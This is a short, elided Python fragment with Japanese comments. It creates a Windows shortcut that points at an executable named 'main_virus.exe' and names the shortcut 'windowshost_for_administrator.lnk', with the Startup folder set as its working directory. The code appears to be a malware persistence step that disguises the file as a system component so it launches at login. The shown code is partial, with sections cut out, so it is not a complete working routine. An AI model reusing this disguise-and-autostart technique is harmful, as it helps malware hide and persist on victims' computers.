...
#リンク先のファイル名
target_file=os.path.join(os.path.dirname(__file__), "dist/main_virus.exe")
#ショートカットを作成するパス
save_path=os.path.join(os.path.dirname(__file__),"windowshost_for_administrator.lnk")
#WSHを生成
...
short.workingDirectory="C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
#ショートカットファイルを作成する
short.Save()
